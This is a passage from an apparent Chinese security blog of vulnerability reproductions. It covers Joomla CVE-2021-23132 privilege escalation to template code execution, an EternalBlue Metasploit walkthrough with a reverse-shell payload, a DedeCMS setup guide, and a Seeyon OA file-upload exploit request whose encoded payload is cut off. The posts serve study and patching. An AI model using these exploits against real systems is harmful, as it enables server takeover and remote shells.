      name&#x3D;&quot;minimum_uppercase&quot;
      type&#x3D;&quot;integer&quot;
      label&#x3D;&quot;COM_USERS_CONFIG_FIELD_MINIMUM_UPPERCASE&quot;
      description&#x3D;&quot;COM_USERS_CONFIG_FIELD_MINIMUM_UPPERCASE_DESC&quot;
      first&#x3D;&quot;0&quot;
      last&#x3D;&quot;98&quot;
      step&#x3D;&quot;1&quot;
      default&#x3D;&quot;0&quot;
    &#x2F;&gt;

    &lt;field
      name&#x3D;&quot;minimum_lowercase&quot;
      type&#x3D;&quot;integer&quot;
      label&#x3D;&quot;COM_USERS_CONFIG_FIELD_MINIMUM_LOWERCASE&quot;
      description&#x3D;&quot;COM_USERS_CONFIG_FIELD_MINIMUM_LOWERCASE_DESC&quot;
      first&#x3D;&quot;0&quot;
      last&#x3D;&quot;98&quot;
      step&#x3D;&quot;1&quot;
      default&#x3D;&quot;0&quot;
    &#x2F;&gt;

  &lt;&#x2F;fieldset&gt;

  &lt;fieldset
    name&#x3D;&quot;user_notes_history&quot;
    label&#x3D;&quot;COM_USERS_CONFIG_FIELD_NOTES_HISTORY&quot; &gt;

    &lt;field
      name&#x3D;&quot;save_history&quot;
      type&#x3D;&quot;radio&quot;
      label&#x3D;&quot;JGLOBAL_SAVE_HISTORY_OPTIONS_LABEL&quot;
      description&#x3D;&quot;JGLOBAL_SAVE_HISTORY_OPTIONS_DESC&quot;
      class&#x3D;&quot;btn-group btn-group-yesno&quot;
      default&#x3D;&quot;0&quot;
      &gt;
      &lt;option value&#x3D;&quot;1&quot;&gt;JYES&lt;&#x2F;option&gt;
      &lt;option value&#x3D;&quot;0&quot;&gt;JNO&lt;&#x2F;option&gt;
    &lt;&#x2F;field&gt;

    &lt;field
      name&#x3D;&quot;history_limit&quot;
      type&#x3D;&quot;number&quot;
      label&#x3D;&quot;JGLOBAL_HISTORY_LIMIT_OPTIONS_LABEL&quot;
      description&#x3D;&quot;JGLOBAL_HISTORY_LIMIT_OPTIONS_DESC&quot;
      filter&#x3D;&quot;integer&quot;
      default&#x3D;&quot;5&quot;
      showon&#x3D;&quot;save_history:1&quot;
    &#x2F;&gt;

  &lt;&#x2F;fieldset&gt;

   &lt;fieldset
    name&#x3D;&quot;massmail&quot;
    label&#x3D;&quot;COM_USERS_MASS_MAIL&quot;
    description&#x3D;&quot;COM_USERS_MASS_MAIL_DESC&quot;&gt;

    &lt;field
       name&#x3D;&quot;mailSubjectPrefix&quot;
       type&#x3D;&quot;text&quot;
      label&#x3D;&quot;COM_USERS_CONFIG_FIELD_SUBJECT_PREFIX_LABEL&quot;
      description&#x3D;&quot;COM_USERS_CONFIG_FIELD_SUBJECT_PREFIX_DESC&quot;
    &#x2F;&gt;

     &lt;field
       name&#x3D;&quot;mailBodySuffix&quot;
      type&#x3D;&quot;textarea&quot;
      label&#x3D;&quot;COM_USERS_CONFIG_FIELD_MAILBODY_SUFFIX_LABEL&quot;
      description&#x3D;&quot;COM_USERS_CONFIG_FIELD_MAILBODY_SUFFIX_DESC&quot;
       rows&#x3D;&quot;5&quot;
       cols&#x3D;&quot;30&quot;
    &#x2F;&gt;

  &lt;&#x2F;fieldset&gt;

  &lt;fieldset
    name&#x3D;&quot;debug&quot;
    label&#x3D;&quot;COM_USERS_DEBUG_LABEL&quot;
    description&#x3D;&quot;COM_USERS_DEBUG_DESC&quot;&gt;

    &lt;field
      name&#x3D;&quot;debugUsers&quot;
      type&#x3D;&quot;radio&quot;
      label&#x3D;&quot;COM_USERS_DEBUG_USERS_LABEL&quot;
      description&#x3D;&quot;COM_USERS_DEBUG_USERS_DESC&quot;
      class&#x3D;&quot;btn-group btn-group-yesno&quot;
      default&#x3D;&quot;1&quot;
      &gt;
      &lt;option value&#x3D;&quot;1&quot;&gt;JYES&lt;&#x2F;option&gt;
      &lt;option value&#x3D;&quot;0&quot;&gt;JNO&lt;&#x2F;option&gt;
    &lt;&#x2F;field&gt;

    &lt;field
      name&#x3D;&quot;debugGroups&quot;
      type&#x3D;&quot;radio&quot;
      label&#x3D;&quot;COM_USERS_DEBUG_GROUPS_LABEL&quot;
      description&#x3D;&quot;COM_USERS_DEBUG_GROUPS_DESC&quot;
      class&#x3D;&quot;btn-group btn-group-yesno&quot;
      default&#x3D;&quot;1&quot;
      &gt;
      &lt;option value&#x3D;&quot;1&quot;&gt;JYES&lt;&#x2F;option&gt;
      &lt;option value&#x3D;&quot;0&quot;&gt;JNO&lt;&#x2F;option&gt;
    &lt;&#x2F;field&gt;

  &lt;&#x2F;fieldset&gt;

  &lt;fieldset name&#x3D;&quot;integration&quot;
    label&#x3D;&quot;JGLOBAL_INTEGRATION_LABEL&quot;
    description&#x3D;&quot;COM_USERS_CONFIG_INTEGRATION_SETTINGS_DESC&quot;
  &gt;

    &lt;field
      name&#x3D;&quot;integration_sef&quot;
      type&#x3D;&quot;note&quot;
      label&#x3D;&quot;JGLOBAL_SEF_TITLE&quot;
    &#x2F;&gt;

    &lt;field
      name&#x3D;&quot;sef_advanced&quot;
      type&#x3D;&quot;radio&quot;
      class&#x3D;&quot;btn-group btn-group-yesno btn-group-reversed&quot;
      default&#x3D;&quot;0&quot;
      label&#x3D;&quot;JGLOBAL_SEF_ADVANCED_LABEL&quot;
      description&#x3D;&quot;JGLOBAL_SEF_ADVANCED_DESC&quot;
      filter&#x3D;&quot;integer&quot;
      &gt;
      &lt;option value&#x3D;&quot;0&quot;&gt;JGLOBAL_SEF_ADVANCED_LEGACY&lt;&#x2F;option&gt;
      &lt;option value&#x3D;&quot;1&quot;&gt;JGLOBAL_SEF_ADVANCED_MODERN&lt;&#x2F;option&gt;
    &lt;&#x2F;field&gt;

    &lt;field
      name&#x3D;&quot;integration_customfields&quot;
      type&#x3D;&quot;note&quot;
      label&#x3D;&quot;JGLOBAL_FIELDS_TITLE&quot;
    &#x2F;&gt;

    &lt;field
      name&#x3D;&quot;custom_fields_enable&quot;
      type&#x3D;&quot;radio&quot;
      label&#x3D;&quot;JGLOBAL_CUSTOM_FIELDS_ENABLE_LABEL&quot;
      description&#x3D;&quot;JGLOBAL_CUSTOM_FIELDS_ENABLE_DESC&quot;
      class&#x3D;&quot;btn-group btn-group-yesno&quot;
      default&#x3D;&quot;1&quot;
      &gt;
      &lt;option value&#x3D;&quot;1&quot;&gt;JYES&lt;&#x2F;option&gt;
      &lt;option value&#x3D;&quot;0&quot;&gt;JNO&lt;&#x2F;option&gt;
    &lt;&#x2F;field&gt;

  &lt;&#x2F;fieldset&gt;

  &lt;fieldset
    name&#x3D;&quot;permissions&quot;
    label&#x3D;&quot;JCONFIG_PERMISSIONS_LABEL&quot;
    description&#x3D;&quot;JCONFIG_PERMISSIONS_DESC&quot;
    &gt;

    &lt;field
      name&#x3D;&quot;rules&quot;
      type&#x3D;&quot;rules&quot;
      label&#x3D;&quot;JCONFIG_PERMISSIONS_LABEL&quot;
      filter&#x3D;&quot;rules&quot;
      validate&#x3D;&quot;rules&quot;
      component&#x3D;&quot;com_users&quot;
      section&#x3D;&quot;component&quot;
    &#x2F;&gt;

  &lt;&#x2F;fieldset&gt;
&lt;&#x2F;config&gt;
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="/images/Joomla!CVE-2021-23132%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/12.png" alt="图片"><br>这一步我自己复现的时候没有实现，再上传的时候提醒“不支持的文件类型”，之后发现在默认设置里加上.xml类型，还是会提醒“无效的MIME类型”，不知道是不是我搞的版本问题(●—●),上传不成功我还尝试直接从本地改文件，还是不行，我怀疑是不是网络流传的xml文件是错的。<br>唉不说了，复现都不成功，真的菜，按照其他大佬的文章，添加好xml文件以后，在普通管理员身份下，即可创建超级管理员用户了。<br><img src="/images/Joomla!CVE-2021-23132%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/13.png" alt="图片"><br>创建一个超级管理员，并登陆系统。登录系统后进入到模板管理。<br><img src="/images/Joomla!CVE-2021-23132%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/14.png" alt="图片"><br>然后在指定模板（默认beez3模板）下修改某个php文件内容。<br><img src="/images/Joomla!CVE-2021-23132%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/15.png" alt="图片"><br>例如这里修改error.php，并添加phpinfo的代码。然后访问：<a href="http://localhost/templates/beez3/error.php">http://localhost/templates/beez3/error.php</a> 可以看到成功执行了phpinfo，实现任意代码执行。<br><img src="/images/Joomla!CVE-2021-23132%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/16.png" alt="图片"></p>
<p>后面我还试了一下网上的POC，果然也是目录遍历没问题，但加xml文件那里就出问题了<br><img src="/images/Joomla!CVE-2021-23132%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/18.png" alt="图片"><br><img src="/images/Joomla!CVE-2021-23132%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/19.png" alt="图片"><br>不过用POC的xml文件直接就给我搞出来个超级管理员用户，哈哈哈这算不算复现成功了呢<br><img src="/images/Joomla!CVE-2021-23132%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20.png" alt="图片"></p>
<h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>当前最新版本为3.9.25，建议相关用户升级到3.9.25版本，已完全修复该漏洞。或者登陆系统后台，系统会提示升级，点击一下完成自动升级即可。<br><img src="/images/Joomla!CVE-2021-23132%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/17.png" alt="图片"></p>
<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="http://hackdig.com/03/hack-293705.htm">http://hackdig.com/03/hack-293705.htm</a><br><a href="https://www.venustech.com.cn/new_type/aqtg/20210310/22465.html">https://www.venustech.com.cn/new_type/aqtg/20210310/22465.html</a></p>
]]></content>
      <categories>
        <category>Web安全</category>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>2021.3</tag>
      </tags>
  </entry>
  <entry>
    <title>永恒之蓝 MS17-010漏洞复现</title>
    <url>/2021/01/22/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%20MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>Eternalblue通过TCP端口445和139来利用SMBv1和NBT中的远程代码执行漏洞，恶意代码会扫描开放445文件共享端口的Windows机器，无需用户任何操作，只要开机上网，不法分子就能在电脑和服务器中植入勒索软件、远程控制木马、虚拟货币挖矿机等恶意程序。</p>
<h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>目前已知受影响的Windows 版本包括但不限于：WindowsNT，Windows2000、Windows XP、Windows 2003、Windows Vista、Windows 7、Windows 8，Windows 2008、Windows 2008 R2、Windows Server 2012 SP0。</p>
<h3 id="漏洞原理代码详解"><a href="#漏洞原理代码详解" class="headerlink" title="漏洞原理代码详解"></a>漏洞原理代码详解</h3><p><a href="http://blogs.360.cn/post/nsa-eternalblue-smb.html#toc-772">http://blogs.360.cn/post/nsa-eternalblue-smb.html#toc-772</a><br><a href="https://blog.csdn.net/qq_27446553/article/details/73480807">https://blog.csdn.net/qq_27446553/article/details/73480807</a></p>
<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>攻击机：kali-Linux-2019   192.168.141.133<br>靶机：Windows7 x64   192.168.141.136</p>
<p>我们可以利用kali-msf框架里收录的永恒之蓝漏洞环境来复现这个漏洞<br>命令打开工具：</p>
<pre class="line-numbers language-none"><code class="language-none">msfconsole<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/images/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9DMS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1.png" alt="图片"><br>上面显示的是漏洞利用数和执行语句数量，接下来选择永恒之蓝的模块</p>
<pre class="line-numbers language-none"><code class="language-none">search ms17_010<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/images/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9DMS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/2.png" alt="图片"><br>有如上几种漏洞利用，我们就选择其中一种</p>
<pre class="line-numbers language-none"><code class="language-none">use exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_eternalblue<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/images/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9DMS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/3.png" alt="图片"><br>然后查看一下有哪些利用语句（payload）</p>
<pre class="line-numbers language-none"><code class="language-none">show payloads<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/images/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9DMS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/4.png" alt="图片"><br>我们选择其中一种执行语句</p>
<pre class="line-numbers language-none"><code class="language-none">set payload windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/images/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9DMS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/5.png" alt="图片"><br>查看一下当前漏洞利用信息</p>
<pre class="line-numbers language-none"><code class="language-none">show options<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/images/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9DMS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/6.png" alt="图片"><br>现在使用的这个漏洞利用是有反弹shell的攻击，RHOSTS就是靶机的ip地址，LHOST是反弹的地址，也就是我们的攻击机ip，把信息对应填入</p>
<pre class="line-numbers language-none"><code class="language-none">set RHOSTS 192.168.141.136
set LHOST 192.168.141.133<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p><img src="/images/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9DMS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/7.png" alt="图片"><br><img src="/images/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9DMS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/8.png" alt="图片"><br>设置完成再检测一下当前漏洞利用信息</p>
<pre class="line-numbers language-none"><code class="language-none">show options<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/images/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9DMS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/9.png" alt="图片"><br>检测无误后执行漏洞</p>
<pre class="line-numbers language-none"><code class="language-none">exploit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/images/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9DMS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/10.png" alt="图片"><br>有以上显示即为攻击成功<br>输入shell，显示获取shell成功<br><img src="/images/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9DMS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/11.png" alt="图片"><br>拥有system最高权限<br><img src="/images/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9DMS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/12.png" alt="图片"><br>尝试截图<br>Screenshot<br><img src="/images/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9DMS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/13.png" alt="图片"><br><img src="/images/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9DMS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/14.png" alt="图片"><br><img src="/images/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9DMS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/15.png" alt="图片"></p>
<h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>①在线更新；开启Windows Update更新。<br>②打补丁；此漏洞对应的微软补丁地址：<a href="https://docs.microsoft.com/zh-cn/security-updates/Securitybulletins/2017/ms17-010">https://docs.microsoft.com/zh-cn/security-updates/Securitybulletins/2017/ms17-010</a></p>
]]></content>
      <categories>
        <category>Web安全</category>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>2017.3</tag>
      </tags>
  </entry>
  <entry>
    <title>dedecms网站搭建</title>
    <url>/2021/01/21/dedecms%E7%BD%91%E7%AB%99%E6%90%AD%E5%BB%BA/</url>
    <content><![CDATA[<ol>
<li>下载织梦开源程序</li>
</ol>
<p><img src="/images/dedecms%E7%BD%91%E7%AB%99%E6%90%AD%E5%BB%BA/1.png" alt="图片"></p>
<ol start="2">
<li>解压织梦程序安装包，将uploads里面所有的程序文件，复制粘贴到phpstudy的WWW文件夹里面。</li>
<li>访问127.0.0.1的DedeCMS网址</li>
</ol>
<p><img src="/images/dedecms%E7%BD%91%E7%AB%99%E6%90%AD%E5%BB%BA/2.png" alt="图片"></p>
<ol start="4">
<li>点击继续</li>
</ol>
<p><img src="/images/dedecms%E7%BD%91%E7%AB%99%E6%90%AD%E5%BB%BA/3.png" alt="图片"></p>
<ol start="5">
<li>点继续，进入参数配置页面，数据库主机：localhost，数据库用户：root，数据库密码：root，对于PHPstudy本地环境来说，这几项是固定的，在这里的数据库名称可以更改，也可以不更改。接着再自己设置一下用户名、密码、网站名称、管理员邮箱即可点击继续安装。</li>
</ol>
<p><img src="/images/dedecms%E7%BD%91%E7%AB%99%E6%90%AD%E5%BB%BA/4.png" alt="图片"></p>
<ol start="6">
<li>安装完成，登录网站后台</li>
</ol>
<p><img src="/images/dedecms%E7%BD%91%E7%AB%99%E6%90%AD%E5%BB%BA/5.png" alt="图片"></p>
<p><img src="/images/dedecms%E7%BD%91%E7%AB%99%E6%90%AD%E5%BB%BA/6.png" alt="图片"></p>
<ol start="7">
<li>登陆成功！</li>
</ol>
<p><img src="/images/dedecms%E7%BD%91%E7%AB%99%E6%90%AD%E5%BB%BA/7.png" alt="图片"></p>
<p><img src="/images/dedecms%E7%BD%91%E7%AB%99%E6%90%AD%E5%BB%BA/8.png" alt="图片"></p>
]]></content>
      <categories>
        <category>Web安全</category>
        <category>环境搭建</category>
      </categories>
  </entry>
  <entry>
    <title>致远OA-ajax.do任意文件上传漏洞复现</title>
    <url>/2021/01/22/%E8%87%B4%E8%BF%9COA-ajax.do%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>致远OA是一套办公协同管理软件。近日，奇安信CERT监测到致远OA的相关漏洞信息。由于致远OA旧版本某些接口存在未授权访问，以及部分函数存在过滤不足，攻击者通过构造恶意请求，可在无需登录的情况下上传恶意脚本文件，从而控制服务器。致远OA官方已针对该漏洞提供补丁。鉴于漏洞危害较大，建议用户尽快应用补丁更新。</p>
<h3 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h3><p>致远OA V8.0<br>致远OA V7.1、V7.1SP1<br>致远OA V7.0、V7.0SP1、V7.0SP2、V7.0SP3<br>致远OA V6.0、V6.1SP1、V6.1SP2<br>致远OA V5.x<br>致远OA G6</p>
<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>访问thirdpartyController.do.css/..;/ajax.do，判断是否存在漏洞</p>
<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;xxx.xxx.xxx.xxx&#x2F;seeyon&#x2F;thirdpartyController.do.css&#x2F;..;&#x2F;ajax.do<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>出现异常：java.lang.NullPointerException:null<br><img src="/images/%E8%87%B4%E8%BF%9COA-ajax.do%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/1.png" alt="图片"><br>使用工具生成payload，我使用的PoC如下：</p>
<pre class="line-numbers language-none"><code class="language-none">POST &#x2F;seeyon&#x2F;autoinstall.do.css&#x2F;..;&#x2F;ajax.do?method&#x3D;ajaxAction&amp;managerName&#x3D;formulaManager&amp;requestCompress&#x3D;gzip HTTP&#x2F;1.1
Host: 127.0.0.1
Connection: close
Cache-Control: max-age&#x3D;0
Upgrade-Insecure-Requests: 1
User-Agent: Opera&#x2F;9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto&#x2F;2.9.168 Version&#x2F;11.52
Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q&#x3D;0.9
Cookie: JSESSIONID&#x3D;7B6D8C106BD599DB0EF2F2E3B794A4FA; loginPageURL&#x3D;; login_locale&#x3D;zh_CN;
Content-Type: application&#x2F;x-www-form-urlencoded
Content-Length: 8819

managerMethod&#x3D;validate&amp;arguments&#x3D;%1F%C2%8B%08%00%00%00%00%00%00%00uTK%C2%93%C2%A2H%10%3E%C3%AF%C3%BE%0A%C3%82%C2%8Bv%C3%B4%C2%8C%C2%8D+c%C2%BB%13%7Bh_%C2%88%28*%28%C2%AF%C2%8D%3D%40%15Ba%15%C2%B0%C3%B2%10%C3%AC%C2%98%C3%BF%C2%BE%05%C3%98%C3%93%3D%C2%B1%C2%BDu%C2%A9%C3%8C%C2%AC%C3%8C%C2%AF%C3%B2%C3%BD%C3%97k%C3%B7%14_H%C2%8E%C2%9DC%C2%95x%C3%9D%3F%C2%98%C3%81%17%C3%A6M%C2%A28%C2%A4%C2%96t3%2F%C3%8D%C2%BA%C3%AF%C3%A2y%C2%99%5C%C2%BC4EqT%3Fj%C3%99%05E%3E%C2%938Y%C3%80%C3%BC%C3%89t%C3%BA%C3%BD%C2%A7%C2%AB%C3%A7%3AI%C2%92%3E%C2%A5%C2%9EW%C3%85%C3%91S%C3%A7%C3%BB%C3%AFL%7B%7E%0B%C2%9D%C3%82%C3%A9%C2%A3%C2%B8%C2%BF%C2%A3%26%C2%99qA%C2%99wa%C2%92w%C2%9A%C2%A3%00%C2%91we%3EQ%C3%AB%C3%95%C3%B8%C2%8F%1D%C2%AD%C2%81%3C%26%C3%90%C3%89%C2%BCA%3FL%C2%93%C2%B2%C3%B3%C3%B0%13%C2%9E%C2%B9%C2%BB%C2%92%06%1E%C3%86%C2%B5%2F%3B1%C2%B9%C2%81YR%C2%B9%C3%9C%C2%98%C2%95%C2%96A%C3%A6%C2%8A%C3%82mKj%19%C2%8B%C2%9C%C2%A5%C3%8A%C2%82Y%5C%C2%AC%C2%B9%24%C2%80d%C2%9E%03%5E%C3%8F%C3%97D%29%5Cm%2C%1F%07%2F%C3%85Q%5CD%C2%B6%26%C3%B9%C2%90%C3%A8%15%C3%A0p%C3%A1%C2%86%2C%C3%9Ah%C3%83J%0A%C2%87%C3%8FN%C2%A4%5C%C2%B7DM%00%C3%91C%28b%C3%8E%C3%96%C2%84%C2%ABe%40%2C%C2%898%03%C3%A2%C2%B8%C2%825%3EYp%C2%96%26%0C%C3%A8%7B%C2%BAFq%C3%9A%C3%B0%C2%A6%C2%9F%5B%C3%BCJ%00K%C2%B5%C3%B8TFqmc%C2%93%C3%8BH*va%C3%B9%0F%C3%A0_%C2%BE%C3%99%C2%A2%1E%C2%BA%C3%A2%C2%A2%C2%B2L5q%C2%B9%C3%A1%C2%A3%24*%C2%A9e*7iq%C3%B4m3%60mC8%C2%83j2%C2%A3%3A7%C3%80%C2%96%C2%85e%C2%A8%18D%C2%99.%C3%8F%5B%C2%BD%C2%838%0E%28F%25%C2%89%C2%9B%C3%84%C3%A3%C2%95%01%C2%A0%C2%B4L%C3%A9-%3F%C2%B8Bc%C2%95%3A%C3%86%C3%86%C3%9Fse%00%C3%B8%C2%8DoW%01%C3%B2L%15K%C2%8B%0CZ%08%C2%8Fh%7C%2C4W%C2%B9%C2%B4l%C3%AD%C3%96D%C3%856%C3%81%C2%B9%7Dl%C2%B1eQJ7%C3%93%12%C2%ADI%C2%89%5D%02Ygz%1E%C2%9DL%C3%B6%C2%99%C3%A6%C2%B4%C3%8E%C3%BB%C3%996j%C2%BDU%40s%40%C3%B3w%C3%8F%5B%C2%A4%C2%84%C2%80%C3%A0%2B%14K%0Cg%C3%82%01.W%C2%89K%C2%80%C3%AF%C3%9CXd%1F%C3%B6%03%C3%BB%C2%B0%C2%A9%C2%B6%C2%86%C2%8D%C2%ADP%3Fo%0F%C3%92%C3%80B%C3%92%08p%C3%BA%C2%AD%C2%A9%01%12%C2%AE%C3%90T%0D%C3%8B%28%07%C2%B6%C3%A6%23%C2%A8I%C2%A9S%C2%9DG%7B%0E_%C2%9D6%C3%86%C3%B1%1B%C2%BD%26%10%C3%839%C2%A6uU%03%C2%97%28X%C2%9E%C2%AE%26%C2%AA%C2%BEA%C3%B2%21%0B%C3%974%06%C3%87%C3%9C%C3%87%1BT%C3%A6%C2%B6%09%C3%BC%23%C2%A7%C2%87u%C2%AC%1A%C2%A7%0BG%7E%C2%82%C2%AD%C3%8A%C2%8F%3F%C3%BC%19%C3%99%C2%BF%C3%BE%C2%99%C3%88%C2%95%C2%84d%C2%AD%C2%91O%C3%AB%7C%C2%81%C3%8AO%C3%96o%C3%B8%C3%9Ay%C3%A4%12%C2%9D%C2%A7%C3%B5%C2%89%C2%A1%18%24%C2%A0j%C3%B4%C3%9A%C3%BA%C3%94z%C2%8D_%C2%BF%C3%96F%C2%9E%C2%9E%C2%A9%1C%C3%84V%25%C2%9C%5D%C3%96%C2%A6%C3%B9X%C2%A4%C2%B2%28%60XMn%C3%90%18%C3%A6%C2%AE%C2%81o%C3%B4m%C2%BA%C3%97%C2%95%C2%85%12%C2%AAs%